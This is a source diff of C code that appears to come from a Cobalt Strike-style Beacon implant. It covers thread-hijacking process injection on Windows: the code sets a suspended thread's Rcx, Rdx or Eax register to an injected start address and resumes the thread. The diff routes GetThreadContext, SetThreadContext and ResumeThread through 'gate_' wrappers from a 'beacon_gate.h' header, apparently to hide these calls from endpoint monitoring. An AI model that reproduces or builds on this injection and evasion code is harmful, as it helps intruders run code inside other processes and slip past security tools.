@@ -1,6 +1,7 @@
 #include <stdlib.h>
 #include <stdio.h>
 #include <windows.h>
+#include "beacon_gate.h" /* BeaconGate: gate_* = the API with the gate in front */
 #include <Tlhelp32.h>
 #include "beacon.h"
 #include "inject.h"
@@ -14,17 +15,17 @@ BOOL inject_via_resumethread_x64(HANDLE hThread, LPVOID lpStartAddress, LPVOID l
 
 	/* try to query some information about our thread */
 	ctx.ContextFlags = CONTEXT_INTEGER;
-	if (!GetThreadContext(hThread, &ctx))
+	if (!gate_GetThreadContext(hThread, &ctx))
 		return FALSE;
 
 	/* update the Rcx value to our new start address, use Rdx to pass a parameter */
 	ctx.Rcx = (DWORD64)lpStartAddress;
 	ctx.Rdx = (DWORD64)lpParameter;
-	if (!SetThreadContext(hThread, &ctx))
+	if (!gate_SetThreadContext(hThread, &ctx))
 		return FALSE;
 
 	/* kick off the thread, please */
-	return ResumeThread(hThread) != -1;
+	return gate_ResumeThread(hThread) != -1;
 }
 
 BOOL inject_via_resumethread_x86(HANDLE hThread, LPVOID lpStartAddress, LPVOID lpParameter) {
@@ -45,7 +46,7 @@ BOOL inject_via_resumethread_x86(HANDLE hThread, LPVOID lpStartAddress, LPVOID l
 		return FALSE;
 
 	/* kick off the thread, please */
-	return ResumeThread(hThread) != -1;
+	return gate_ResumeThread(hThread) != -1;
 }
 
 BOOL inject_via_resumethread(INJECTCONTEXT * injctx, LPVOID lpStartAddress, LPVOID lpParameter) {
@@ -71,15 +72,15 @@ BOOL inject_via_resumethread(INJECTCONTEXT * injctx, LPVOID lpStartAddress, LPVO
 
 	/* try to query some information about our thread */
 	ctx.ContextFlags = CONTEXT_INTEGER;
-	if (!GetThreadContext(injctx->hThread, &ctx))
+	if (!gate_GetThreadContext(injctx->hThread, &ctx))
 		return FALSE;
 
 	/* update the Eax value to our new start address */
 	ctx.Eax = (DWORD)lpStartAddress;
-	if (!SetThreadContext(injctx->hThread, &ctx))
+	if (!gate_SetThreadContext(injctx->hThread, &ctx))
 		return FALSE;
 
 	/* kick off the thread, please */
-	return ResumeThread(injctx->hThread) != -1;
+	return gate_ResumeThread(injctx->hThread) != -1;
 }
 #endif
